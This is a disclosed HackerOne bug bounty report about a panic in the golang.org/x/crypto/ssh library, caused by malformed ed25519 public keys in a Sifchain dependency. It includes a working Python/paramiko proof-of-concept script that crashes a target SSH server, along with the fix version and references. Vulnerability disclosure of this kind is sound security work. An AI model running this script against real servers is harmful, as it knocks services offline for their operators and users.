# Signature Verification /// golang.org/x/crypto/ssh

## Report Details
- **Report ID**: 1276384
- **URL**: https://hackerone.com/reports/1276384
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-07-23T18:46:20.991Z
- **Disclosed**: 2021-12-09T17:44:54.208Z

## Reporter
- **Username**: dpredrag
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sifchain

## Vulnerability Information
## Summary:
Crypto package are vulnerable to Improper Signature Verification "
An attacker can craft an ssh-ed25519 or sk-ssh-...@openssh.com public key, such that the library will panic when trying to verify a signature with it. Clients can deliver such a public key and signature to any golang.org/x/crypto/ssh server with a PublicKeyCallback, and servers can deliver them to any golang.org/x/crypto/ssh client "

Introduced through: github.com/Sifchain/sifnode@0.0.0 › golang.org/x/crypto@v0.0.0-20201016220609-9e8e0b390897
Introduced through: github.com/Sifchain/sifnode@0.0.0 › github.com/tyler-smith/go-bip39@v1.1.0 › golang.org/x/crypto@v0.0.0-20200622213623-75b288015ac9
and few more I can provide more points if needed

{F1386859}

## Steps To Reproduce:

1 . python poc.py localhost 2022 root (or x.x.x.x depends on setup)

poc.py

```
# This should cause a panic on the remote server.
#

#!/usr/bin/env python

import socket
import sys

import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST

if len(sys.argv) != 4:
    print('./poc.py <host> <port> <user>')
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

t = paramiko.Transport(sock)
t.start_client()

t.lock.acquire()
m = paramiko.Message()
m.add_byte(cMSG_SERVICE_REQUEST)
m.add_string("ssh-userauth")
t._send_message(m)

m = paramiko.Message()
m.add_byte(cMSG_USERAUTH_REQUEST)
m.add_string(user)
m.add_string("ssh-connection")
m.add_string('publickey')
m.add_boolean(True)
m.add_string('ssh-ed25519')

# Send an SSH key that is too short (ed25519 keys are 32 bytes)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15key-that-is-too-short')

# Send an empty signature (the server won't get far enough to validate it)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

t._send_message(m)

print('Malformed auth request sent. This should cause a panic on the remote server.')
```

This can be fixed by upgrading to golang.org/x/crypto@0.0.0-20201203163018-be400aefbc4c 

## Supporting Material/References:
https://groups.google.com/g/golang-announce/c/3L45YRc91SY
https://github.com/golang/crypto/commit/bac4c82f69751a6dd76e702d54b3ceb88adab236

## Impact

Summary

## Attachments
- screencapture-github-golang-crypto-commit-bac4c82f69751a6dd76e702d54b3ceb88adab236-2021-07-23-20_42_26.png
